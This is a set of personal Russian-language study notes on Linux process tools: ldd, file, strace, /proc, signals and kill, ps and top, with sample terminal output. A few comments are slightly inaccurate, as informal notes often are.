        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f50180ec000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5017ec4000)
        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f5017e2d000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f501814e000)
ldd /usr/bin/cal
        linux-vdso.so.1 (0x00007fffc4ead000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f3a9ea1b000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3a9e7f3000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f3a9ea68000)

file /usr/bin/cal
     /usr/bin/cal: symbolic link to ncal
file -L /usr/bin/cal // ELF - executable linked format, динамический 
/usr/bin/cal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b774856dacf000e2a030cfb0efbbe6a7b96a4bb4, for GNU/Linux 3.2.0, stripped
ELF - признак программы (exe и lib библиотеки)
file -L /lib64/ld-linux-x86-64.so.2 // просмотр св-в библиотеки, не исполняемый , "shared object"
     /lib64/ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux),          dynamically linked, BuildID[sha1]=61ef896a699bb1c2e4e231642b2e1688b2f1a61e, strippe
ldd /lib64/ld-linux-x86-64.so.2 // библ-ка-ЗАГРУЗЧИК программ в процесс сформирована СТАТИЧЕСКИ!, file -L -ошибается на счет "dynamically linked"
        statically linked  

ldd /bin/date
     linux-vdso.so.1 (0x00007ffc268a0000)
     libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffa0bed8000)
     /lib64/ld-linux-x86-64.so.2 (0x00007ffa0c12d000)

==== Трассировка программ ==== 
   https://habr.com/ru/company/otus/blog/525012/ !!!!!!!
   https://losst.pro/komanda-strace-v-linux?cmdurl=1

strace выполняет трассировку системыых вызовов к ядру, выполняемых через libc
ltrace выполняет трассировку системных вызовов к ядру, выполняемых через библиотеки и потом уже через libc

strace -o trace.log ls // трассировать прогр ls с выводом в файл trace.log !!
По умолчанию strace отображает не всю информацию о системных вызовах. 
strace -v ls testdir // опция -v verbose  покажет дополнительную информацию о каждом системном вызове:
strace -r ls testdir // отразить время, проведенное между системными вызовами
strace -f ls testdir // параметр -f для отслеживания дочерних процессов, созданных запущенным процессом:
strace -c ls testdir // отразить статист-ку системных вызовов, количество их запусков и процент времени, затраченного на выполнение? Вы можете использовать опцию -c, чтобы получить эту статистику:

strace -fe openat cmnd// Трассировать всместе с дочерними процессами Trace child processes as they are created by currently traced processes
strace -e openat date // трассировать прогр date на предмет открываемых файлов
  openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 // 3 - возрат дескриптора файла
  openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
  openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
  openat(AT_FDCWD, "/etc/localtime", O_RDONLY|O_CLOEXEC) = 3
Пн 30 янв 2023 12:39:20 +03

strace -e openat blkid
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libblkid.so.1", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/etc/blkid.conf", O_RDONLY|O_CLOEXEC) = -1 ENOENT (Нет такого файла или каталога)
openat(AT_FDCWD, "/run/blkid/blkid.tab", O_RDONLY|O_CLOEXEC) = 3
...
openat(AT_FDCWD, "/sys/dev/block/8:2", O_RDONLY|O_CLOEXEC) = 3
openat(3, "dm/uuid", O_RDONLY|O_CLOEXEC) = -1 ENOENT (Нет такого файла или каталога)
openat(AT_FDCWD, "/dev/sda2", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 EACCES (Отказано в доступе)
/dev/sda2: UUID="54d6b2b9-4dde-4a7c-9953-f6386668aaa7" TYPE="swap" PARTUUID="4dcae767-32a9-4daf-b233-89627e574731"
openat(AT_FDCWD, "/sys/dev/block/8:3", O_RDONLY|O_CLOEXEC) = 3
openat(3, "dm/uuid", O_RDONLY|O_CLOEXEC) = -1 ENOENT (Нет такого файла или каталога)
openat(AT_FDCWD, "/dev/sda3", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 EACCES (Отказано в доступе)
/dev/sda3: UUID="9DCA-6AA1" BLOCK_SIZE="512" TYPE="vfat" PARTUUID="0d0d5900-eb88-4a55-9b2b-0753b0a98ad9"
openat(AT_FDCWD, "/sys/dev/block/8:1", O_RDONLY|O_CLOEXEC) = 3
openat(3, "dm/uuid", O_RDONLY|O_CLOEXEC) = -1 ENOENT (Нет такого файла или каталога)
openat(AT_FDCWD, "/dev/sda1", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 EACCES (Отказано в доступе)
/dev/sda1: UUID="1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="6b85becb-5c69-4d32-acdb-27d23b65b872"
openat(AT_FDCWD, "/sys/dev/block/8:4", O_RDONLY|O_CLOEXEC) = 3
openat(3, "dm/uuid", O_RDONLY|O_CLOEXEC) = -1 ENOENT (Нет такого файла или каталога)
openat(AT_FDCWD, "/dev/sda4", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 EACCES (Отказано в доступе)
+++ exited with 0 +++

strace -e openat ps // трассировать прогр ps на предмет открываемых файлов
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libprocps.so.8", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libsystemd.so.0", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/liblzma.so.5", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libzstd.so.1", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/liblz4.so.1", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcap.so.2", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgcrypt.so.20", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgpg-error.so.0", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/proc/self/auxv", O_RDONLY) = 3
openat(AT_FDCWD, "/proc/sys/kernel/osrelease", O_RDONLY) = 3
openat(AT_FDCWD, "/proc/meminfo", O_RDONLY) = 4
openat(AT_FDCWD, "/proc", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 5
openat(AT_FDCWD, "/proc/1/stat", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/1/status", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2/stat", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2/status", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/3/stat", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/3/status", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/4/stat", O_RDONLY) = 6


sudo strace -p 1693 -e write // подключиться к процессу bash (другой оболочке) 
                           и показывать трассировку сист вызовов "write" при "echo ABCD"
strace: Process 1693 attached
write(2, "\33[?2004l\r", 9)             = 9
write(1, "ABCD\n", 5)                   = 5
write(2, "\33[?2004h", 8)               = 8

sudo strace -p 2255 // просмотреть трассировку процесса cat c pid 2255 в другой оболочке
strace: Process 2255 attached
read(0, "hi\n", 131072)                 = 3 // ввод строки "hi" в cat
write(1, "hi\n", 3)                     = 3 // вывод cat строки "hi"

kill -s SIGTSTP 2397 // перевести в фоновый режим/остановить процесс 2397 (ping ...), работающий в оболочке
kill -s SIGCONT 2397 // возвратить из фонового режима процесс 2397 (ping ...)


cat /proc/7025/status //просмотр инф-ции о процессе через файл псевдофайловой системы proc - из них ps берет данные
Name:   polkit-gnome-au
Umask:  0002
State:  S (sleeping)
Tgid:   7025
Ngid:   0
Pid:    7025
PPid:   6693
TracerPid:      0
Uid:    999     999     999     999
Gid:    999     999     999     999
FDSize: 64
Groups: 4 24 27 30 46 115 137 999 1002
VmPeak:   289008 kB
VmSize:   223872 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:     19524 kB
VmData:    18448 kB
VmStk:       132 kB
VmExe:        24 kB
VmLib:     22020 kB
VmPTE:       140 kB
VmSwap:        0 kB
Threads:        3

ps up 1 // вывод в пользовательском формате инф. о init/systemd
ps up 7025
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
mint        7025  0.0  0.8 223872 18148 ?        Sl   Feb13   0:00 /usr/lib/policykit-1-gnome/polkit-gnome-authentication-a

lsof -p PID // вывод списка открытых файлов для процесса PID (см ПОДРОБНО выше и ниже по тексту!)


cat /proc/17209/maps // просмотр карты сегмента процесса htop (PID=17209)
 см ниже сегменты вирт памяти процесса [heap] [stack], а также куда загружены a)программы процесса  htop и библиотеки libs a также b) /usr/lib/locale/C.utf8/LC_CTYPE (и др) - открытые файлы процесса с) [vdso] - linux-vdso.so.1 ВООБРАЖАЕМАЯ/виртульная/псевдо библиотека  r-xp /usr/bin/htop - код htop, остальные - rw-p / r--p это данные htop. Аналогично далее для библиотек  rw-p - обозначение сегментов откуда можно читать, куда можно писать , а таже признак p -private - не делится с др.процессами 
(!! уменьшить zoom для корректного просмотра!!)
55c600a5f000-55c600a6d000 r--p 00000000 00:1b 4125                       /usr/bin/htop
55c600a6d000-55c600a92000 r-xp 0000e000 00:1b 4125                       /usr/bin/htop
55c600a92000-55c600a9e000 r--p 00033000 00:1b 4125                       /usr/bin/htop
55c600a9f000-55c600aa4000 r--p 0003f000 00:1b 4125                       /usr/bin/htop
55c600aa4000-55c600aa5000 rw-p 00044000 00:1b 4125                       /usr/bin/htop
55c600aa5000-55c600aa7000 rw-p 00000000 00:00 0
55c601bd4000-55c601cb9000 rw-p 00000000 00:00 0                          [heap]
7fdb261e5000-7fdb261e7000 r--p 00000000 00:1b 37765                      /usr/lib/x86_64-linux-gnu/libsensors.so.5.0.0
7fdb261e7000-7fdb261ee000 r-xp 00002000 00:1b 37765                      /usr/lib/x86_64-linux-gnu/libsensors.so.5.0.0
7fdb261ee000-7fdb261f2000 r--p 00009000 00:1b 37765                      /usr/lib/x86_64-linux-gnu/libsensors.so.5.0.0
7fdb261f2000-7fdb261f3000 ---p 0000d000 00:1b 37765                      /usr/lib/x86_64-linux-gnu/libsensors.so.5.0.0
7fdb261f3000-7fdb261f4000 r--p 0000d000 00:1b 37765                      /usr/lib/x86_64-linux-gnu/libsensors.so.5.0.0
7fdb261f4000-7fdb261f5000 rw-p 0000e000 00:1b 37765                      /usr/lib/x86_64-linux-gnu/libsensors.so.5.0.0
7fdb26205000-7fdb2625c000 r--p 00000000 00:1b 16054                      /usr/lib/locale/C.utf8/LC_CTYPE
7fdb2625c000-7fdb267cf000 r--p 00000000 00:1b 16065                      /usr/lib/locale/locale-archive
7fdb267cf000-7fdb267d4000 rw-p 00000000 00:00 0
7fdb267d4000-7fdb267fc000 r--p 00000000 00:1b 36637                      /usr/lib/x86_64-linux-gnu/libc.so.6
7fdb267fc000-7fdb26991000 r-xp 00028000 00:1b 36637                      /usr/lib/x86_64-linux-gnu/libc.so.6
7fdb26991000-7fdb269e9000 r--p 001bd000 00:1b 36637                      /usr/lib/x86_64-linux-gnu/libc.so.6
7fdb269e9000-7fdb269ed000 r--p 00214000 00:1b 36637                      /usr/lib/x86_64-linux-gnu/libc.so.6
7fdb269ed000-7fdb269ef000 rw-p 00218000 00:1b 36637                      /usr/lib/x86_64-linux-gnu/libc.so.6
7fdb269ef000-7fdb269fc000 rw-p 00000000 00:00 0
7fdb269fc000-7fdb269fe000 r--p 00000000 00:1b 37494                      /usr/lib/x86_64-linux-gnu/libnl-genl-3.so.200.26.0
7fdb269fe000-7fdb26a01000 r-xp 00002000 00:1b 37494                      /usr/lib/x86_64-linux-gnu/libnl-genl-3.so.200.26.0
7fdb26a01000-7fdb26a02000 r--p 00005000 00:1b 37494                      /usr/lib/x86_64-linux-gnu/libnl-genl-3.so.200.26.0
7fdb26a02000-7fdb26a03000 ---p 00006000 00:1b 37494                      /usr/lib/x86_64-linux-gnu/libnl-genl-3.so.200.26.0
7fdb26a03000-7fdb26a04000 r--p 00006000 00:1b 37494                      /usr/lib/x86_64-linux-gnu/libnl-genl-3.so.200.26.0
7fdb26a04000-7fdb26a05000 rw-p 00007000 00:1b 37494                      /usr/lib/x86_64-linux-gnu/libnl-genl-3.so.200.26.0
7fdb26a05000-7fdb26a0d000 r--p 00000000 00:1b 37492                      /usr/lib/x86_64-linux-gnu/libnl-3.so.200.26.0
7fdb26a0d000-7fdb26a1c000 r-xp 00008000 00:1b 37492                      /usr/lib/x86_64-linux-gnu/libnl-3.so.200.26.0
7fdb26a1c000-7fdb26a25000 r--p 00017000 00:1b 37492                      /usr/lib/x86_64-linux-gnu/libnl-3.so.200.26.0
7fdb26a25000-7fdb26a27000 r--p 0001f000 00:1b 37492                      /usr/lib/x86_64-linux-gnu/libnl-3.so.200.26.0
7fdb26a27000-7fdb26a28000 rw-p 00021000 00:1b 37492                      /usr/lib/x86_64-linux-gnu/libnl-3.so.200.26.0
7fdb26a28000-7fdb26a36000 r--p 00000000 00:1b 37379                      /usr/lib/x86_64-linux-gnu/libm.so.6
7fdb26a36000-7fdb26ab2000 r-xp 0000e000 00:1b 37379                      /usr/lib/x86_64-linux-gnu/libm.so.6
7fdb26ab2000-7fdb26b0d000 r--p 0008a000 00:1b 37379                      /usr/lib/x86_64-linux-gnu/libm.so.6
7fdb26b0d000-7fdb26b0e000 r--p 000e4000 00:1b 37379                      /usr/lib/x86_64-linux-gnu/libm.so.6
7fdb26b0e000-7fdb26b0f000 rw-p 000e5000 00:1b 37379                      /usr/lib/x86_64-linux-gnu/libm.so.6
7fdb26b0f000-7fdb26b1d000 r--p 00000000 00:1b 37895                      /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7fdb26b1d000-7fdb26b2e000 r-xp 0000e000 00:1b 37895                      /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7fdb26b2e000-7fdb26b3c000 r--p 0001f000 00:1b 37895                      /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7fdb26b3c000-7fdb26b40000 r--p 0002c000 00:1b 37895                      /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7fdb26b40000-7fdb26b41000 rw-p 00030000 00:1b 37895                      /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7fdb26b41000-7fdb26b49000 r--p 00000000 00:1b 37453                      /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7fdb26b49000-7fdb26b72000 r-xp 00008000 00:1b 37453                      /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7fdb26b72000-7fdb26b7a000 r--p 00031000 00:1b 37453                      /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7fdb26b7a000-7fdb26b7b000 ---p 00039000 00:1b 37453                      /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7fdb26b7b000-7fdb26b7c000 r--p 00039000 00:1b 37453                      /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7fdb26b7c000-7fdb26b7d000 rw-p 0003a000 00:1b 37453                      /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7fdb26b86000-7fdb26b8d000 r--s 00000000 00:1b 35368                      /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7fdb26b8d000-7fdb26b8f000 rw-p 00000000 00:00 0
7fdb26b8f000-7fdb26b91000 r--p 00000000 00:1b 36082                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdb26b91000-7fdb26bbb000 r-xp 00002000 00:1b 36082                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdb26bbb000-7fdb26bc6000 r--p 0002c000 00:1b 36082                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdb26bc7000-7fdb26bc9000 r--p 00037000 00:1b 36082                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdb26bc9000-7fdb26bcb000 rw-p 00039000 00:1b 36082                      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffca5a88000-7ffca5aa9000 rw-p 00000000 00:00 0                          [stack]
7ffca5b7e000-7ffca5b82000 r--p 00000000 00:00 0                          [vvar]
7ffca5b82000-7ffca5b84000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]

 ################# СИГНАЛЫ ПРОЦЕССОВ (см doc файл) ########################
Ядро  Kernel (файл vmlinuz - является образом для процесса init.
Init ( (супердемон)) запускается первым, имеет PID=1 и далее запускает все остальные системные процессы, пользовательские  процессы и демоны.
Ядерные системный процессы работаю в фоновом режиме,имеют параметр VSZ в ps или VIRT в top/htop Равный нулю и параметр связи с терминалом (TTY=?). Обычные процессы имею связь с терминалом, параметр TTY=pts/n. 
Службы (демоны) запускаются в фоновом режиме, как  правило их названия заканчиваются на «d», имеют параметр VSZ в ps или VIRT в top/htop НЕравный нулю, но параметр связи с терминалом (TTY=?)

https://ru.wikipedia.org/wiki/%D0%A1%D0%B8%D0%B3%D0%BD%D0%B0%D0%BB_(Unix) !!!
man 7 sigtal
 Standard signals
       Linux supports the standard signals listed below.  The second column of the table indiтАР
       cates  which  standard (if any) specified the signal: "P1990" indicates that the signal
       is described in the original POSIX.1-1990 standard; "P2001" indicates that  the  signal
       was added in SUSv2 and POSIX.1-2001.

       Signal      Standard   Action   Comment
       SIGABRT      P1990      Core    Abort signal from abort(3)
       SIGALRM      P1990      Term    Timer signal from alarm(2)
       SIGBUS       P2001      Core    Bus error (bad memory access)
       SIGCHLD      P1990      Ign     Child stopped or terminated
       SIGCLD         -        Ign     A synonym for SIGCHLD
       SIGCONT      P1990      Cont    Continue if stopped
       SIGEMT         -        Term    Emulator trap
       SIGFPE       P1990      Core    Floating-point exception
       SIGHUP       P1990      Term    Hangup detected on controlling terminal
                                       or death of controlling process
       SIGILL       P1990      Core    Illegal Instruction
       SIGINFO        -                A synonym for SIGPWR
Сигналы процессам можно послать:
 1) через клавиатру комбинациями клавиш -  текущему процессу в оболчке 
 2) программно командой kill -  текущему процессу в оболчке и ЛЮБОМУ иному процессу (даже "не в" оболочке )
Номера сигналов (см man 7 signal)
Для процессов SIGINT =  ctrl-c - штатное завершение (с корректным закрытием всех файлов, потоков и освобождением памяти процесса)
Для процессов  SIGQUIT=ctrl-\ - авариное завершение (БЕЗ корректного закрытия всех файлов, потоков...) 
     + ВЫДАЕТ дамп памяти
Для процессов  SIGKILL - принудительно выгрузить процесс!!(ПРИМЕНЯТЬ с ОСТРОЖНСТЬЮ,
   закрытие процесса без корректного закрытия файлов, потоков и освобождением памяти процесса)
Для процессов SIGSTP=ctrl-z приостановить процесс с терминала tty
Для процессов SIGSTOP приостановить процесс ctrl-s?
Для процессов SIGCONT возобновить процесс ctrl-q?

Для демонов SIGTERM - аналог  SIGINT=ctrl-c  - попросить процесс сохранить данные и завершится
Для демонов SIGABRT - аналог SIGQUIT=ctrl-\  
Для демонов SIGKILL - принудительно выгрузить демона

 kill = 1) ПРОГРАММа /usr/bin/kill 2) Внутрення команда bash!!
kill -15 PID_N // послать SIGTERM (см выше, и man 7 signal)
kill -9 PID_N // послать SIGKILL (см выше, и man 7 signal)
kill -19 PID_N // послать SIGSTOP, приостановить процесс
kill -18 PID_N // послать SIGCONT, продолжить процесс

kill -SIGINT PID_N // ctrl-c
kill -SIGQUIT PID_N  // ctrl-\
kill -SIGKILL PID_N // kill применять с осторожностью, возможно повреждение!!
killall -s SIGSTOP iperf3
/usr/bin/kill -l   //список сигналов ПРОГРАММЫ kill
HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM STKFLT
CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL PWR SYS
!!!!!!!!!!!!!!!!!!!
killall  iperf3
пОСЛЕ SIGSTOP возобн-ся через SIGCONT но не выгружается по SIGTERM(killall iperf3), только по SIGKILL(killall -SIGKILL iperf3)  
ЕСли SIGSTOP не приостанавливать SIGCONT, то выгружается и по SIGTERM, и по SIGKILL  
-----
ps aux | grep iperf3
mint       11948  0.0  0.0   8272   504 ?        Ts   22:49   0:00 iperf3 -s -p 9999 -D
mint       12023  0.0  0.1   9604  2092 pts/0    S+   22:53   0:00 grep --color=auto iperf3  killall -KILL iperf3
mint@mint:~$ ps -aux | grep iperf3
mint       12023  0.0  0.1   9604  2092 pts/0    S+   22:53   0:00 grep --color=auto iperf3

/usr/bin/kill -L //список сигналов ПРОГРАММЫ kill
 1 HUP      2 INT      3 QUIT     4 ILL      5 TRAP     6 ABRT     7 BUS
 8 FPE      9 KILL    10 USR1    11 SEGV    12 USR2    13 PIPE    14 ALRM
15 TERM    16 STKFLT  17 CHLD    18 CONT    19 STOP    20 TSTP    21 TTIN
22 TTOU    23 URG     24 XCPU    25 XFSZ    26 VTALRM  27 PROF    28 WINCH
29 POLL    30 PWR     31 SYS
oem@LnxPC:~$

 kill -L // список сигалов ВНУТРЕННЕЙ команды bash
 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP
 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1
11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM
16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP
21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ
26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR
31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
63) SIGRTMAX-1  64) SIGRTMAX


id // печать наcтоящих и эффективных пользователей и ID их групп
-------------- TOP HTOP ------------------------
ls -l /proc/13185 // список ресурсов ОС, используемых процессом 
top — выводит активные процессы и потоки
 ТАКЖЕ top показывает общую инф о загрузке системы
 top - 14:59:20 up 6:30, 2 users, load average: 0.07, 0.02, 0.00
 Tasks: 109 total, 1 running, 106 sleeping, 0 stopped, 2 zombie
 Cpu(s): 0.7%us, 1.0%sy, 0.0%ni, 98.3%id, 0.0%wa, 0.0%hi, 0.0%si
 Mem: 319496k total, 314860k used, 4636k free, 19392k buff
 Swap: 875500k total, 149128k used, 726372k free, 114676k cach 
htop — цветной top
ctrl-z - приостоновка выполняющегося процесса 
jobs — выводит список активных заданий.
jobs -l //  jobs с отображением PID процессов !!
bg n — переводит задание n из jobs в фоновый режим работы. аналог ctrl-z
fg n — переводит задание n из jobs в режим работы на переднем плане.
kill NNN // посылает сигнал TERM  процессу c ID NNN из ps.
kill -INT pidN // послать сигдал прервать с очиткой процессом всех занятых ресурсов, при KILL - ресурсы не очищаются
kill -s KILL NNN // посылает сигнал TERM процессу c ID NNN из ps.
kill -KILL NNN // посылает сигнал KILL процессу c ID NNN из ps.
killall — останавливает процессы по именам.
shutdown — останавливает или перезагружает систему.

#####################   PS    ####################
ps -получает информацию из ядра псевдофайловой системы proc (из каталога /proc)
  Основные ключи:
-e - вывести информацию обо всех процессах
-a - вывести информацию обо всех наиболее часто запрашиваемых процессах
-t - показывать только процессы из этого терминала
-p - показывать информацию только об указанном процессе !!!!!
-u - показывать процессы только определенного пользователя

  = = Запуск программ с периодически, с обновлением их stdout = =
man: watch - execute a program periodically, showing output fullscreen
watch tail /var/log/syslog
watch ps aux

  = = приоритеты процессов = =
nice -n 10 firefox //указать приоритет для запускаемого процесса:
renice -n -10 -p 1343 // изменить приоритет для уже существующего по pid

ps up 1 // вывод в пользовательском формате инф. о init/systemd
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.5 100804 11832 ?        Ss   14:07   0:01 /sbin/init text

pidof proс_name // возвращает pid процесса
pidof bash 
1610 1551  // запущено 2 процесса bash

ps -А равно ps -e // список !!! всех процессов Linux, выполняющихся в текущий момент
ps aux // РАСШИРЕННЫЙ  список ВСЕХ (СИСТЕМНЫЙ, ДЕМОНОВ,ПОЛЬЗОВАТЕЛЬСКИХ), выполняющихся в текущий момент процессов 
    USER Это владелец процесса, %MEM Использование памяти в процентах, VSZ Объем виртуальной памяти (Виртуальный размер процесса),  RSS Размер страниц памяти. Объем физ ОЗУ,используемой процессом, кб
ps -au //u=для user, РАСШИРЕННЫЙ  список процессов, выполняющихся в текущий момент и запущенных ВСЕМИ теримналами и пользователями pts и bash
ps l // РАСШИРЕННЫЙ  список процессов,  man:  "Display BSD long format" 
Поле STAT при запуске ps -au
R - Процесс выполняется в данный момент
S - Процесс ожидает выполнение (спит)
D - Процесс в полной (непрерываемой) спячке, например, ожидает ввода/вывода
Z - zombie или defunct процесс, т.е. процесс у которого нет родителя.
T - Процесс остановлен.
W - процесс в свопе
< - процесс в приоритетном режиме.
N - процесс в режиме низкого приоритета
L - real-time процесс, имеются страницы заблокированные в памяти.

PROCESS STATE CODES коды state процессов
       Here are the different values that the s, stat and state output specifiers (header
       "STAT" or "S") will display to describe the state of a process:
               D    uninterruptible sleep (usually IO)
               I    Idle kernel thread
               R    running or runnable (on run queue)
               S    interruptible sleep (waiting for an event to complete)
               T    stopped by job control signal
               t    stopped by debugger during the tracing
               W    paging (not valid since the 2.6.xx kernel)
               X    dead (should never be seen)
               Z    defunct ("zombie") process, terminated but not reaped by its parent
 additional characters may be displayed:
               <    high-priority (not nice to other users)
               N    low-priority (nice to other users)
               L    has pages locked into memory (for real-time and custom IO)
               s    is a session leader
               l    is multi-threaded (using CLONE_THREAD, like NPTL pthreads do)
               +    is in the foreground process group
ps //КРАТКИЙ список процессов, выполняющихся в текущий момент и запущенных pts0 bash
ps T //РАСШИРЕННЫЙ список процессов, выполняющихся в текущий момент и запущенных pts0 bash
ps l //РАСШИРЕННЫЙ список полей для процессов,
ps mint // список процессов, выполняющихся в текущий момент и запущенных mint
ps aux |grep xed >> f // найти описание процесса xed записать в f

strace -e openat ps aux // ps берет инфу из /proc/*
root        2353  0.0  0.0      0     0 ?        I    23:27   0:00 [kworker/u4:0-events_unbound]
openat(AT_FDCWD, "/proc/2412/stat", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2412/status", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2412/cmdline", O_RDONLY) = 6
root        2412  0.0  0.0      0     0 ?        I    23:29   0:00 [kworker/1:1-events]
openat(AT_FDCWD, "/proc/2450/stat", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2450/status", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2450/cmdline", O_RDONLY) = 6
oem         2450  0.0  0.1  13596  3912 pts/0    S+   23:30   0:00 strace -e openat ps aux
openat(AT_FDCWD, "/proc/2453/stat", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2453/status", O_RDONLY) = 6
openat(AT_FDCWD, "/proc/2453/cmdline", O_RDONLY) = 6
oem         2453  0.0  0.1  15240  3640 pts/0    R+   23:30   0:00 ps aux

pstree mint // ДЕРЕВО процессов, выполняющихся в текущий момент и запущенных mint
ps auxw // w - wide не обрезать (ПЕРЕНОСИТЬ) информацию справа
ps aux --sort=%mem // сортировать по  полю mem
ps aux --sort=-%cpu //  сортировать ОБРАТНО по  полю cpu
ps -u mint // список процессов, выполняющихся в текущий момент и запущенных mint  info //  https://1cloud.ru/help/security/ispolzovanie-komandy-ps-dlya-prosmotra-protsessov-linux
ps x // расшир слепок обо всех процессах, у которых НЕТ терминалов!
ps u // расшир слепок обо всех процессах в РАСШИР.ПОЛЬЗОВАТЕЛЬСКОМ ФОРМАТЕ
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
mint       31610  0.0  0.2  14648  5584 pts/2    Ss   04:58   0:00 bash
mint       31632  0.0  0.1  13696  3628 pts/3    T    05:01   0:00 man 7 signal
ps up 1967 // слепок о процессe PID=1967 в РАСШИР.ПОЛЬЗОВАТЕЛЬСКОМ ФОРМАТЕ
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
